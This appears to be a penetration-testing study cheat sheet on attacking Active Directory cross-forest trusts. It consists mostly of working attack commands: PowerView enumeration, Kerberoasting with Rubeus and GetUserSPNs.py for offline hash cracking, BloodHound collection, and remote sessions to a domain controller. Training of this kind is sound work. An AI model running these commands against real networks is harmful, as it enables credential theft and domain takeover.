---
layout: app
title: "AD Domain Trusts Cross-Forest"
tags: ["Kerberoasting"]
section: "Active Directory"
---

# Enumerating Accounts for Associated SPNs Using Get-DomainUser

```powershell
(powerview)> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```

```powershell
(powerview)> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
```


## Performing a Kerberoasting Attacking with Rubeus Using /domain Flag

```powershell
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

# Admin Password Re-Use & Group Membership

```powershell
(powerview)> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
(powerview)>Convert-SidToName [Group SID]
```
## Accessing to DC Using Enter-PSSession

```powershell
(powerview)> Enter-PSSession -ComputerName COMPUTER-DC.DOMAIN -Credential domain\administrator
```
# Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

```bash
GetUserSPNs.py -target-domain [cross domain] domain/username
```
Rerunning the command with the **-request** flag added gives us the TGS ticket. We could also add **-outputfile** <OUTPUT FILE> to output directly into a file that we could then turn around and run Hashcat against.

## Using the -request Flag

```bash
GetUserSPNs.py -request -target-domain [cross domain] domain/username
```

# Hunting Foreign Group Membership with Bloodhound-python


```bash
bloodhound-python -d [domain] -dc [domain computer] -c All -u [username] -p [password]
```

## Compressing the File with zip -r
```bash
zip -r ilfreight_bh.zip *.json
```

After uploading the second set of data (either each JSON file or as one zip file), we can click on Users with Foreign Domain Group Membership under the Analysis tab and select the source domain as **[principal domain]**. Here, we will see the built-in Administrator account for the **[domain name]** domain is a member of the built-in Administrators group in the **[child domain]** domain as we saw previously.

![](https://academy.hackthebox.com/storage/modules/143/foreign_membership.png)

